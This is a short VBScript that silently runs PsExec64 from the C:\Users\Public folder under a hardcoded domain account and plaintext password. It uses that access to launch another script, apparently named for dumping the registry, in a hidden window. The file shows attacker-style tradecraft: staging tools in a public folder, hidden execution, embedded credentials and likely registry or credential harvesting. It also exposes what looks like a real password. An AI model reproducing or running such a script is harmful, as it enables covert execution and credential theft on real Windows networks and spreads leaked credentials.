Dim sh
Set sh = CreateObject("WScript.Shell")
sh.Run "C:\Users\Public\PsExec64.exe -accepteula -nobanner -i 1 -u ""ALM\skudnew"" -p ""Admin910327"" -w C:\Users\Public -d C:\Windows\System32\wscript.exe //nologo C:\Users\Public\dump_reg2.vbs", 0, True
WScript.Sleep 8000
